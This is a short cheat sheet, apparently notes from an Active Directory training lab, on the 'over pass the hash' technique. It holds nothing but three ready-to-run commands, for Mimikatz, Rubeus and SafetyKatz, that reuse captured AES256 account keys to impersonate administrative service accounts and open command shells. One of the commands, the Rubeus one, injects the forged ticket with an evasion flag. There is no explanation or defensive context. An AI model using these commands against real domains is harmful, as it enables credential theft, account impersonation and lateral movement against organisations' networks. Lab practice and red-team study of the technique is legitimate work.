# Over Pass The Hash

## Mimikatz

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /run:powershell.exe"'
```

## Rubeus

```
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

## Safety Katz

```
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /run:cmd.exe" "exit"
```
